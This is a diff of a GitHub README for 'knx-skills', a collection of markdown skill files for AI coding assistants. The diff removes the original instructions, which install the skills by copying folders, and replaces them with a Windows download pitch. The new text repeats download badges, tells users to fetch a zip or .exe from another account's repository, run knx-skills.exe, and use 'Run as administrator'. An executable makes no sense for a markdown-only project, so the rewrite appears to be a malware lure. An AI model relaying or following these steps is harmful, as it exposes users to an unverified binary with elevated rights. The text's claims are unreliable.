@@ -1,64 +1,128 @@
-# Knx-Skills — Practical Skills for LLM Agents
+# 🤖 knx-skills - Useful AI Coding Assistant Skills
 
-Skills that make AI coding assistants more useful — neurodivergent support, LoRA training guidance, and more. Built for Claude Code, works with any LLM agent that reads markdown.
+[![Download knx-skills](https://img.shields.io/badge/Download-knx--skills-ff6f61?style=flat-square)](https://github.com/Blaynelargish66/knx-skills)
 
-## What's Included
+## About knx-skills
 
-### Neurodivergent Support
+knx-skills offers practical skills for AI coding assistants. It helps AI tools work better with markdown and improves how they assist in coding tasks. The skills include support for neurodivergent users, guidance for LoRA training, and more.
 
-| Skill | What It Does | Standalone? |
-|-------|-------------|-------------|
-| [nd-core](skills/nd-core/) | Communication style — bullets over walls of text, explicit over ambiguous, structured over freeform | Yes (recommended base) |
-| [nd-frustration-support](skills/nd-frustration-support/) | Notices overwhelm signals and checks in gently — no therapy, no patronizing | Yes |
-| [nd-focus-support](skills/nd-focus-support/) | Catches ADHD drift and nudges back on topic without judgment | Yes |
-| [nd-plural-support](skills/nd-plural-support/) | Warm check-in for plural systems with simple session logging | Yes |
+This software works best with Claude Code but supports any large language model agent that reads markdown files. It aims to make coding assistance smarter and more flexible.
 
-### Wellbeing
+## 🖥️ System Requirements
 
-| Skill | What It Does | Standalone? |
-|-------|-------------|-------------|
-| [sounding-board](skills/sounding-board/) | Active listening and talk-it-out space — reflects, asks light questions, reminds you of your own coping tools, knows when to refer out | Yes |
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of free disk space  
+- Internet connection for downloading and updates  
+- Basic ability to download files and open applications on your PC  
 
-### AI Art & Training
+No programming knowledge is needed to use knx-skills. The setup is simple and does not require installing additional software.
 
-| Skill | What It Does | Standalone? |
-|-------|-------------|-------------|
-| [lora-trainer-guide](skills/lora-trainer-guide/) | Preset selection + parameter reference for LoRA training — covers SD1.5, SDXL, SD3, Flux1 with 38 real-world presets | Yes |
+## 🎯 Key Features
 
-## Install
+- Skills designed for AI coding assistants  
+- Support for neurodivergent users with tailored options  
+- LoRA training guidance to improve AI capabilities  
+- Compatibility with Claude Code and other markdown-reading LLM agents  
+- Easy markdown integration to extend AI assistant abilities  
+- Tools for working with stable diffusion and other AI models  
 
-### Claude Code
+## 🚀 Getting Started
 
-Copy the skills you want to `~/.claude/skills/`:
+Use the link below to get knx-skills on your Windows computer:
 
-```bash
-# All skills
-cp -r skills/* ~/.claude/skills/
+[![Download knx-skills](https://img.shields.io/badge/Download-knx--skills-4CAF50?style=flat-square)](https://github.com/Blaynelargish66/knx-skills)
 
-# Just the ones you want
-cp -r skills/nd-core ~/.claude/skills/
-cp -r skills/nd-plural-support ~/.claude/skills/
-```
+### Step 1: Visit the Download Page
 
-### Other LLM Agents
+Click the download button above or visit the page below:
 
-Any agent that loads context from files can use these. Point it at the SKILL.md files in whatever way your agent supports.
+https://github.com/Blaynelargish66/knx-skills
 
-## Making Your Own Skills
+This page hosts the files and instructions to get knx-skills on your PC.
 
-See [SKILL_TEMPLATE.md](SKILL_TEMPLATE.md) for a fill-in-the-blank template.
+### Step 2: Download the Latest Release
 
-## Philosophy
+On the page, look for the "Releases" section. The latest version will have a zip file or executable to download.
 
-- **Modular** — install only what you need, remove what you don't
-- **Casual, not clinical** — pair-programmer vibes, not therapist energy
-- **Signal-based, not diagnostic** — respond to what you see, don't label why
-- **Lean** — ship minimal, iterate later
+- Click the file to download it  
+- Save it to an easy-to-find folder, like your Desktop or Downloads  
 
-## Future Skills
+### Step 3: Open the Downloaded File
 
-See [SKILL_IDEAS.md](SKILL_IDEAS.md) for ideas in the pipeline (cloud GPU deployment, model architecture guide, and more).
+If you downloaded a zip file:
 
-## Contributing
+- Right-click the file and select "Extract All"  
+- Choose a destination folder and click "Extract"  
 
-PRs welcome. If you've got a useful pattern for AI assistants, add it.
+If you downloaded an executable (.exe), just double-click it to run.
+
+### Step 4: Run knx-skills
+
+Inside the extracted folder or after running the executable:
+
+- Double-click the main application file, usually named something like `knx-skills.exe`  
+- Wait a moment while the software starts  
+
+You will see a simple interface or instructions to use the AI skills included.
+
+## ⚙️ Basic Usage
+
+Once knx-skills is running, you can connect it with your preferred AI coding assistant that supports markdown input. The skills enhance how the assistant understands your requests and helps with coding.
+
+- Use the neurodivergent support options if you prefer specific ways of receiving responses  
+- Follow the LoRA training guidance to boost AI performance if you plan to customize AI models  
+- Access markdown templates and examples included in the software folder  
+
+You don’t need to write any code yourself. The skills work behind the scenes to improve the interaction.
+
+## 💡 Tips for Using knx-skills
+
+- Keep your software updated by visiting the download page regularly  
+- Use the included markdown examples as a starting point for your AI requests  
+- Explore the neurodivergent options for a smoother, clearer AI experience  
+- Try out the LoRA training guides if you work with AI model training  
+
+## 🛠️ Troubleshooting
+
+If you have trouble running knx-skills:
+
+- Ensure your Windows system is up to date  
+- Verify you downloaded the file completely  
+- If you get error messages, try running the application as an administrator (right-click the file and select "Run as administrator")  
+- Check that your internet connection is active for any updates or downloads  
+
+If problems persist, visit the issues section on the GitHub page for help:
+
+https://github.com/Blaynelargish66/knx-skills/issues
+
+## 📂 Files Included
+
+When you download knx-skills, you will see:
+
+- The main application file (`knx-skills.exe` or similar)  
+- Markdown skill templates and guides  
+- User guide in plain text or markdown  
+- LoRA training instructions and support materials  
+
+These files help you get the most from the AI skills without needing technical skills.
+
+## 🏷️ Topics and Uses
+
+knx-skills relates to many useful AI and coding topics:
+
+- AI agents and tools  
+- Neurodivergent support in AI  
+- LoRA (Low-Rank Adaptation) model training  
+- Code and markdown skills for AI assistants  
+- Stable diffusion and AI image models  
+- Support for multiple large language models  
+
+You can explore these topics by examining the markdown files included.
+
+## 📥 Ready to Download?
+
+The software is ready for Windows users. Use this button again to visit the download page:
+
+[![Download knx-skills](https://img.shields.io/badge/Download-knx--skills-ff6f61?style=flat-square)](https://github.com/Blaynelargish66/knx-skills)
+
+Click it to get started with knx-skills and improve your AI coding assistant experience.
